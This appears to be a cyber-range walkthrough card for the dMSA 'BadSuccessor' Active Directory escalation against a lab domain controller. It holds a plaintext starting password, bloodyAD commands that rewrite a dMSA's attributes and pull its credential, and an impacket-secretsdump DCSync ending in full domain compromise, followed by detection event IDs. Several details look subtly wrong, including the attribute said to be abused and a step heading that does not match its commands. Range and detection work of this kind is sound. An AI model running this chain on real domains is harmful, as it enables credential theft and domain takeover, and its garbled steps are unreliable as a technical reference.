# WT#026 — dMSA / BadSuccessor (CVE-2025-53779)

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.12 (dc03) |
| **Domain** | range.local |
| **Starting Credential** | adversary_lead / Adv3rsary_L3ad! |
| **Tools Required** | bloodyAD, impacket-secretsdump |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1558 |
| **Difficulty** | Medium |

## Prerequisites
- `adversary_lead` has `GenericWrite` on `dmsaPrivService$` in range.local
- Network access to dc03 (192.168.77.12)

## Attack Steps

### 1. Verify GenericWrite privilege
```powershell
bloodyAD --host 192.168.77.12 -d range.local -u adversary_lead -p 'Adv3rsary_L3ad!' get object dmsaPrivService$ --attr msDS-AllowedToDelegateTo,msDS-ManagedPasswordId
```

### 2. Create a fake machine account or use existing dc03$
Write the SID of dc03$ into `msDS-ManagedPasswordPreviousId` to make the KDC think dc03$ was a previous owner of the dMSA secret.

```powershell
# Get dc03$ SID
bloodyAD --host 192.168.77.12 -d range.local -u adversary_lead -p 'Adv3rsary_L3ad!' get object DC03$ --attr objectSid

# Write dc03$ SID as the previous managed password ID
bloodyAD --host 192.168.77.12 -d range.local -u adversary_lead -p 'Adv3rsary_L3ad!' set object dmsaPrivService$ msDS-ManagedPasswordPreviousId '<dc03$_SID>'
```

### 3. Retrieve dMSA credential as dc03$
```powershell
bloodyAD --host 192.168.77.12 -d range.local -u adversary_lead -p 'Adv3rsary_L3ad!' get dmsa dmsaPrivService$
```

### 4. DCSync range.local
```powershell
impacket-secretsdump -just-dc 'range.local/dmsaPrivService$@192.168.77.12' -hashes :<dmsa_nthash>
```

## Post-Exploitation Chain
dMSA credential → Domain controller machine account → DCSync → Full domain compromise (range.local)

## Telemetry Verification
- **Event 4662** (An operation was performed on an object): `msDS-ManagedPasswordPreviousId` write on `dmsaPrivService$`
- **Event 4782** (Password hash of an account was accessed): dMSA password retrieval
- **Sysmon Event 1**: bloodyAD or secretsdump process creation

## Status
CONFIGURED
